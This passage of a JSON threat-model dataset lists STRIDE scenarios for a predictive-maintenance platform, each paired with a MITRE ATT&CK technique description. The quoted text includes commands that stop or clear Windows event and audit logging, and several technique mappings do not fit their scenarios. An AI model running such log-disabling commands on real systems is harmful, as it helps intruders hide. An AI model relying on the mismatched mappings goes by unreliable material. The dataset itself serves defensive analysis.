                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Malware on the Data Logger alters logged data before forwarding.",
            "Assumptions": [
                {
                    "Assumption": "The Data Logger\u2019s firmware is not adequately protected.",
                    "Role": "System Administrator",
                    "Condition": "True if firmware lacks security measures."
                },
                {
                    "Assumption": "The attacker can upload and execute malware on the Data Logger.",
                    "Role": "Attacker",
                    "Condition": "True if physical or remote access is possible."
                }
            ],
            "Potential Impact": "Integrity of data is compromised, resulting in false predictions and incorrect maintenance schedules.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "logger",
                "malware",
                "data integrity"
            ],
            "mitre_technique": {
                "name": "Extra Window Memory Injection",
                "description": "Adversaries may inject malicious code into process via Extra Window Memory (EWM) in order to evade process-based defenses as well as possibly elevate privileges. EWM injection is a method of executing arbitrary code in the address space of a separate live process. \n\nBefore creating a window, graphical Windows-based processes must prescribe to or register a windows class, which stipulate appearance and behavior (via windows procedures, which are functions that handle input/output of data).(Citation: Microsoft Window Classes) Registration of new windows classes can include a request for up to 40 bytes of EWM to be appended to the allocated memory of each instance of that class. This EWM is intended to store data specific to that window and has specific application programming interface (API) functions to set and get its value. (Citation: Microsoft GetWindowLong function) (Citation: Microsoft SetWindowLong function)\n\nAlthough small, the EWM is large enough to store a 32-bit pointer and is often used to point to a windows procedure. Malware may possibly utilize this memory location in part of an attack chain that includes writing code to shared sections of the process\u2019s memory, placing a pointer to the code in EWM, then invoking execution by returning execution control to the address in the process\u2019s EWM.\n\nExecution granted through EWM injection may allow access to both the target process's memory and possibly elevated privileges. Writing payloads to shared sections also avoids the use of highly monitored API calls such as <code>WriteProcessMemory</code> and <code>CreateRemoteThread</code>.(Citation: Elastic Process Injection July 2017) More sophisticated malware samples may also potentially bypass protection mechanisms such as data execution prevention (DEP) by triggering a combination of windows procedures and other system functions that will rewrite the malicious payload inside an executable portion of the target process.  (Citation: MalwareTech Power Loader Aug 2013) (Citation: WeLiveSecurity Gapz and Redyms Mar 2013)\n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via EWM injection may also evade detection from security products since the execution is masked under a legitimate process. ",
                "id": "attack-pattern--0042a9f5-f053-4769-b3ef-9ad018dfa298",
                "technique_id": "T1055.011"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies the AI/ML model parameters within the TOREADOR Platform.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient access controls to the TOREADOR Platform.",
                    "Role": "System Developer",
                    "Condition": "True if access controls are weak or misconfigured."
                },
                {
                    "Assumption": "The attacker gains administrative privileges on the platform.",
                    "Role": "Attacker",
                    "Condition": "True if privileged access is obtained."
                }
            ],
            "Potential Impact": "Predictive models produce unreliable maintenance predictions and optimization plans.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "platform",
                "model parameters",
                "privilege"
            ],
            "mitre_technique": {
                "name": "Extra Window Memory Injection",
                "description": "Adversaries may inject malicious code into process via Extra Window Memory (EWM) in order to evade process-based defenses as well as possibly elevate privileges. EWM injection is a method of executing arbitrary code in the address space of a separate live process. \n\nBefore creating a window, graphical Windows-based processes must prescribe to or register a windows class, which stipulate appearance and behavior (via windows procedures, which are functions that handle input/output of data).(Citation: Microsoft Window Classes) Registration of new windows classes can include a request for up to 40 bytes of EWM to be appended to the allocated memory of each instance of that class. This EWM is intended to store data specific to that window and has specific application programming interface (API) functions to set and get its value. (Citation: Microsoft GetWindowLong function) (Citation: Microsoft SetWindowLong function)\n\nAlthough small, the EWM is large enough to store a 32-bit pointer and is often used to point to a windows procedure. Malware may possibly utilize this memory location in part of an attack chain that includes writing code to shared sections of the process\u2019s memory, placing a pointer to the code in EWM, then invoking execution by returning execution control to the address in the process\u2019s EWM.\n\nExecution granted through EWM injection may allow access to both the target process's memory and possibly elevated privileges. Writing payloads to shared sections also avoids the use of highly monitored API calls such as <code>WriteProcessMemory</code> and <code>CreateRemoteThread</code>.(Citation: Elastic Process Injection July 2017) More sophisticated malware samples may also potentially bypass protection mechanisms such as data execution prevention (DEP) by triggering a combination of windows procedures and other system functions that will rewrite the malicious payload inside an executable portion of the target process.  (Citation: MalwareTech Power Loader Aug 2013) (Citation: WeLiveSecurity Gapz and Redyms Mar 2013)\n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via EWM injection may also evade detection from security products since the execution is masked under a legitimate process. ",
                "id": "attack-pattern--0042a9f5-f053-4769-b3ef-9ad018dfa298",
                "technique_id": "T1055.011"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies having made specific changes or taken specific actions within the dashboard.",
            "Assumptions": [
                {
                    "Assumption": "Lack of transaction logging and audit trails.",
                    "Role": "System Administrator",
                    "Condition": "True if logs are not maintained or monitored."
                },
                {
                    "Assumption": "Inadequate user activity tracking.",
                    "Role": "System Developer",
                    "Condition": "True if user actions are not logged."
                }
            ],
            "Potential Impact": "Difficulty in attributing actions, complicating incident response and accountability.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "auditing",
                "logging",
                "user actions"
            ],
            "mitre_technique": {
                "name": "Disable Windows Event Logging",
                "description": "Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more.(Citation: Windows Log Events) This data is used by security tools and analysts to generate detections.\n\nThe EventLog service maintains event logs from various system components and applications.(Citation: EventLog_Core_Technologies) By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating to <code>Security Settings\\Local Policies\\Audit Policy</code> for basic audit policy settings or <code>Security Settings\\Advanced Audit Policy Configuration</code> for advanced audit policy settings.(Citation: Audit_Policy_Microsoft)(Citation: Advanced_sec_audit_policy_settings) <code>auditpol.exe</code> may also be used to set audit policies.(Citation: auditpol)\n\nAdversaries may target system-wide logging or just that of a particular application. For example, the Windows EventLog service may be disabled using the <code>Set-Service -Name EventLog -Status Stopped</code> or <code>sc config eventlog start=disabled</code> commands (followed by manually stopping the service using <code>Stop-Service  -Name EventLog</code>).(Citation: Disable_Win_Event_Logging)(Citation: disable_win_evt_logging) Additionally, the service may be disabled by modifying the \u201cStart\u201d value in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog</code> then restarting the system for the change to take effect.(Citation: disable_win_evt_logging)\n\nThere are several ways to disable the EventLog service via registry key modification. First, without Administrator privileges, adversaries may modify the \"Start\" value in the key <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Security</code>, then reboot the system to disable the Security EventLog.(Citation: winser19_file_overwrite_bug_twitter) Second, with Administrator privilege, adversaries may modify the same values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-System</code> and <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application</code> to disable the entire EventLog.(Citation: disable_win_evt_logging)\n\nAdditionally, adversaries may use <code>auditpol</code> and its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the <code>/success</code> or <code>/failure</code> parameters. For example, <code>auditpol /set /category:\u201dAccount Logon\u201d /success:disable /failure:disable</code> turns off auditing for the Account Logon category.(Citation: auditpol.exe_STRONTIC)(Citation: T1562.002_redcanaryco) To clear the audit policy, adversaries may run the following lines: <code>auditpol /clear /y</code> or <code>auditpol /remove /allusers</code>.(Citation: T1562.002_redcanaryco)\n\nBy disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.",
                "id": "attack-pattern--4eb28bed-d11a-4641-9863-c2ac017d910a",
                "technique_id": "T1562.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker falsifies sensor data logs before it is received by the Receiver.",
            "Assumptions": [
                {
                    "Assumption": "Weak or non-existent log integrity checks.",
                    "Role": "System Developer",
                    "Condition": "True if log integrity mechanisms are not implemented."
                },
                {
                    "Assumption": "The attacker has access to the Data Logger.",
                    "Role": "Attacker",
                    "Condition": "True if physical or network access is possible."
                }
            ],
            "Potential Impact": "Mismatch in data integrity causing fault in predictive analysis.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "log falsification",
                "integrity",
                "sensor data"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to influence external outcomes or hide activity, thus threatening the integrity of the data.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making.\n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--1cfcb312-b8d7-47a4-b560-4b16cc677292",
                "technique_id": "T1565.001"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Users cannot verify the source of changes to AI/ML model configurations.",
            "Assumptions": [
                {
                    "Assumption": "No version control or change tracking in place.",
                    "Role": "System Developer",
                    "Condition": "True if changes are not tracked."
                },
                {
                    "Assumption": "Multiple users share login credentials.",
                    "Role": "User",
                    "Condition": "True if proper user account management is not enforced."
                }
            ],
            "Potential Impact": "Undetected malicious alterations and lack of accountability.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "change tracking",
                "user management",
                "version control"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive operational data is intercepted during transmission to the cloud.",
            "Assumptions": [
                {
                    "Assumption": "Data is transmitted without encryption.",
                    "Role": "System Designer",
                    "Condition": "True if no encryption is used."
                },
                {
                    "Assumption": "The network used for transmission is insecure.",
                    "Role": "Attacker",
                    "Condition": "True if network security controls are weak."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive data, compromising confidentiality.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "data transmission",
                "encryption",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker gains access to the anonymized data but can still infer sensitive information.",
            "Assumptions": [
                {
                    "Assumption": "Anonymization techniques are weak or improperly implemented.",
                    "Role": "System Developer",
                    "Condition": "True if poor anonymization methods are used."
                },
                {
                    "Assumption": "Data re-identification is possible with the available metadata.",
                    "Role": "Attacker",
                    "Condition": "True if metadata remains accessible."
                }
            ],
            "Potential Impact": "Revealing sensitive information despite anonymization efforts.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "anonymization",
                "meta data",
                "data re-identification"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Unauthorized access to the TOREADOR Platform's database containing sensitive data.",
            "Assumptions": [
                {
                    "Assumption": "Database lacks sufficient access controls.",
                    "Role": "System Administrator",
                    "Condition": "True if access controls are weak or absent."
                },
                {
                    "Assumption": "The attacker has credentials for database access.",
                    "Role": "Attacker",
                    "Condition": "True if attacker can obtain or bypass credentials."
                }
            ],
            "Potential Impact": "Exposure of confidential data stored in the cloud-based platform.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "database access",
                "access control",
                "credentials"
            ],
            "mitre_technique": {
                "name": "Boot or Logon Initialization Scripts",
                "description": "Adversaries may use scripts automatically executed at boot or logon initialization to establish persistence.(Citation: Mandiant APT29 Eye Spy Email Nov 22)(Citation: Anomali Rocke March 2019) Initialization scripts can be used to perform administrative functions, which may often execute other programs or send information to an internal logging server. These scripts can vary based on operating system and whether applied locally or remotely.  \n\nAdversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary. \n\nAn adversary may also be able to escalate their privileges since some boot or logon initialization scripts run with higher privileges.",
                "id": "attack-pattern--03259939-0b57-482f-8eb5-87c0e0d54334",
                "technique_id": "T1037"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Distributed Denial of Service (DDoS) attack on the dashboard, making it inaccessible to users.",
            "Assumptions": [
                {
                    "Assumption": "The application lacks adequate DDoS protection.",
                    "Role": "System Administrator",
                    "Condition": "True if no DDoS countermeasures are in place."
                },
                {
                    "Assumption": "The attacker can generate sufficient traffic load.",
                    "Role": "Attacker",
                    "Condition": "True if the attacker has resource capacity."
                }
            ],
            "Potential Impact": "Service disruption causing inability to access critical maintenance data in a timely fashion.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "DDoS",
                "dashboard",
                "inaccessibility"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Malware-caused resource exhaustion on the Data Logger.",
            "Assumptions": [
                {
                    "Assumption": "Data Logger lacks resource monitoring and limits.",
                    "Role": "System Designer",
                    "Condition": "True if no monitoring or limits are implemented."
                },
                {
                    "Assumption": "The attacker can install and execute malicious code.",
                    "Role": "Attacker",
                    "Condition": "True if there's inadequate anti-malware protection."
                }
            ],
            "Potential Impact": "Inability to log or transmit sensor data, leading to failures in predictive maintenance.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "malware",
                "resource exhaustion",
                "data logger"
            ],
            "mitre_technique": {
                "name": "OS Exhaustion Flood",
                "description": "Adversaries may launch a denial of service (DoS) attack targeting an endpoint's operating system (OS). A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity. These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes.\n\nDifferent ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.(Citation: Arbor AnnualDoSreport Jan 2018) With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.(Citation: Cloudflare SynFlood)\n\nACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.(Citation: Corero SYN-ACKflood)",
                "id": "attack-pattern--0df05477-c572-4ed6-88a9-47c581f548f7",
                "technique_id": "T1499.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attack exploiting a zero-day in the TOREADOR Platform's cloud infrastructure.",
            "Assumptions": [
                {
                    "Assumption": "Zero-day vulnerability exists and is unpatched.",
                    "Role": "Vendor/Developer",
                    "Condition": "True if zero-day is known and unaddressed."
                },
                {
                    "Assumption": "Attacker discovers and exploits the vulnerability.",
                    "Role": "Attacker",
                    "Condition": "True if vulnerability scanning is possible."
                }
            ],
            "Potential Impact": "Complete or partial disruption of the AI/ML models processing, affecting predictive maintenance and power flow optimization.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "zero-day",
                "cloud",
                "infrastructure"
            ],
            "mitre_technique": {
                "name": "IP Addresses",
                "description": "Adversaries may gather the victim's IP addresses that can be used during targeting. Public IP addresses may be allocated to organizations by block, or a range of sequential addresses. Information about assigned IP addresses may include a variety of details, such as which IP addresses are in use. IP addresses may also enable an adversary to derive other details about a victim, such as organizational size, physical location(s), Internet service provider, and or where/how their publicly-facing infrastructure is hosted.\n\nAdversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about assigned IP addresses may also be exposed to adversaries via online or other accessible data sets (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)).(Citation: WHOIS)(Citation: DNS Dumpster)(Citation: Circl Passive DNS) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)).",
                "id": "attack-pattern--0dda99f0-4701-48ca-9774-8504922e92d3",
                "technique_id": "T1590.005"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker escalates privileges within the TOREADOR Platform to gain full control.",
            "Assumptions": [
                {
                    "Assumption": "System has misconfigurations or known vulnerabilities.",
                    "Role": "System Administrator",
                    "Condition": "True if misconfigurations or vulnerabilities exist."
                },
                {
                    "Assumption": "Attacker has some level of access initially.",
                    "Role": "Attacker",
                    "Condition": "True if attacker can gain initial foothold."
                }
            ],
            "Potential Impact": "Full system compromise, allowing unauthorized changes, data theft, or system sabotage.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "privilege escalation",
                "system control",
                "compromise"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Exploiting a vulnerability in the Anonymity Agent to execute arbitrary commands.",
            "Assumptions": [
                {
                    "Assumption": "Vulnerability is present and exploitable.",
                    "Role": "System Developer",
                    "Condition": "True if the agent has known flaws."
                },
                {
                    "Assumption": "Attacker can interact with the Anonymity Agent.",
                    "Role": "Attacker",
                    "Condition": "True if attacker can send commands to the agent."
                }
            ],
            "Potential Impact": "Achieving elevated access, leading to possible data tampering and injection of malicious data.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "exploit",
                "anonymity agent",
                "command execution"
            ],
            "mitre_technique": {
                "name": "Exploit Public-Facing Application",
                "description": "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet accessible open sockets.(Citation: NVD CVE-2016-6662)(Citation: CIS Multiple SMB Vulnerabilities)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks)(Citation: NVD CVE-2014-7169) Depending on the flaw being exploited this may also involve [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211) or [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203).\n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs, exploit container host access via [Escape to Host](https://attack.mitre.org/techniques/T1611), or take advantage of weak identity and access management policies.\n\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.(Citation: Mandiant Fortinet Zero Day)(Citation: Wired Russia Cyberwar)\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25)",
                "id": "attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c",
                "technique_id": "T1190"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Compromising a legitimate user account with administrative privileges on the dashboard.",
            "Assumptions": [
                {
                    "Assumption": "Users have administrative privileges they don't need.",
                    "Role": "System Administrator",
                    "Condition": "True if principle of least privilege is not followed."
                },
                {
                    "Assumption": "Weak or reused passwords are used.",
                    "Role": "User",
                    "Condition": "True if password policies are not stringent."
                }
            ],
            "Potential Impact": "Control over dashboard functionalities, leading to changes in system settings and potential data breaches.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "user account",
                "administrative privileges",
                "dashboard"
            ],
            "mitre_technique": {
                "name": "Permission Groups Discovery",
                "description": "Adversaries may attempt to discover group and permission settings. This information can help adversaries determine which user accounts and groups are available, the membership of users in particular groups, and which users and groups have elevated permissions.\n\nAdversaries may attempt to discover group permission settings in many different ways. This data may provide the adversary with information about the compromised environment that can be used in follow-on activity and targeting.(Citation: CrowdStrike BloodHound April 2018)",
                "id": "attack-pattern--15dbf668-795c-41e6-8219-f0447c0e64ce",
                "technique_id": "T1069"
            }
        }
    ]
},
{
    "case_number": "9",
    "batch_number": "7",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker spoofs sensor data to simulate abnormal conditions indicating hardware failure.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has physical or remote access to sensor networks.",
                    "Role": "Attacker",
                    "Condition": "Access is not adequately restricted or monitored."
                },
                {
                    "Assumption": "The attacker understands the data format expected by the Data Logger.",
                    "Role": "Attacker",
                    "Condition": "Knowledge of the sensor network protocols."
                },
                {
                    "Assumption": "The attacker can inject malicious data into the sensor network.",
                    "Role": "Attacker",
                    "Condition": "Insufficient data validation checks at the Data Logger."
                }
            ],
            "Potential Impact": "Incorrect predictive maintenance leading to unnecessary maintenance actions.",
            "MITRE ATT&CK Keywords": [
                "Spoofing",
                "Network",
                "Injection",
                "Manipulation"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker impersonates a legitimate user to access the dashboard.",
            "Assumptions": [
                {
                    "Assumption": "Weak or absent authentication mechanisms for dashboard access.",
                    "Role": "Attacker",
                    "Condition": "Authentication mechanism can be bypassed."
                },
                {
                    "Assumption": "Knowledge of legitimate user credentials or capability to phish them.",
                    "Role": "Attacker",
                    "Condition": "Credentials are compromised or poorly managed."
                },
                {
                    "Assumption": "The attacker is aware of the dashboard's URL and its role.",
                    "Role": "Attacker",
                    "Condition": "Publicly accessible dashboard URL with no access controls in place."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive data and operational insights.",
            "MITRE ATT&CK Keywords": [
                "Spoofing",
                "Credential Access",
                "Web Application",
                "Phishing"
            ],
            "mitre_technique": {
                "name": "Steal Web Session Cookie",
                "description": "An adversary may steal web application or service session cookies and use them to gain access to web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.\n\nCookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.(Citation: Pass The Cookie)\n\nThere are several examples of malware targeting cookies from web browsers on the local system.(Citation: Kaspersky TajMahal April 2019)(Citation: Unit 42 Mac Crypto Cookies January 2019) Adversaries may also steal cookies by injecting malicious JavaScript content into websites or relying on [User Execution](https://attack.mitre.org/techniques/T1204) by tricking victims into running malicious JavaScript in their browser.(Citation: Talos Roblox Scam 2023)(Citation: Krebs Discord Bookmarks 2023)\n\nThere are also open source frameworks such as `Evilginx2` and `Muraena` that can gather session cookies through a malicious proxy (e.g., [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)) that can be set up by an adversary and used in phishing campaigns.(Citation: Github evilginx2)(Citation: GitHub Mauraena)\n\nAfter an adversary acquires a valid cookie, they can then perform a [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004) technique to login to the corresponding web application.",
                "id": "attack-pattern--10ffac09-e42d-4f56-ab20-db94c67d76ff",
                "technique_id": "T1539"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker masquerades as a trusted service to intercept data between the Data Logger and the Receiver.",
            "Assumptions": [
                {
                    "Assumption": "Lack of encrypted communication between Data Logger and Receiver.",
                    "Role": "Attacker",
                    "Condition": "Plaintext data transmission over the network."
                },
                {
                    "Assumption": "Attacker can position themselves between Data Logger and Receiver.",
                    "Role": "Attacker",
                    "Condition": "Network access not sufficiently restricted."
                },
                {
                    "Assumption": "Trust relationships between components are not verified.",
                    "Role": "Attacker",
                    "Condition": "No mutual authentication mechanisms are in place."
                }
            ],
            "Potential Impact": "Interception and possible alteration of sensitive sensor data.",
            "MITRE ATT&CK Keywords": [
                "Man-in-the-Middle",
                "Network Interception",
                "Spoofing",
                "Eavesdropping"
